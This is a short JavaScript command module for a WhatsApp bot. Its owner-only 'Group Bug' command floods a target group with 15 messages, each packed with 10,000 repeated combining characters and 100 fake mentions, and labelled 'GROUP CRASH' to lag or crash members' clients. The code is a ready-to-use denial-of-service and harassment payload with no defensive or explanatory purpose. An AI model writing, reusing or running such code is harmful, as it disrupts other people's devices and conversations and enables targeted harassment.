module.exports = async function(sock, from, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
    
    try {
        let target = from; // Default to current group
        if (q && q.endsWith('@g.us')) target = q;
        
        if (!target.endsWith('@g.us')) {
            return await sock.sendMessage(from, { text: '⚠️ This command must be used in a group or provide a group JID.' }, { quoted: msg });
        }

        await sock.sendMessage(from, { text: `🔥 *Initiating Group Bug...*\nTarget: ${target}\nPayload: High-Intensity Lag` }, { quoted: msg });

        const lagPayload = "҈".repeat(10000);
        const mentionPayload = "Mention Bug: " + "@0 ".repeat(100);

        for (let i = 0; i < 15; i++) {
            try {
                await sock.sendMessage(target, { 
                    text: `🔥 GROUP CRASH #${i+1}\n` + lagPayload,
                    mentions: Array(100).fill('0@s.whatsapp.net')
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (e) {}
        }

        await sock.sendMessage(from, { text: '✅ *Group Bug sequence completed!*' }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(from, { text: '❌ Error: ' + e.message }, { quoted: msg });
    }
};
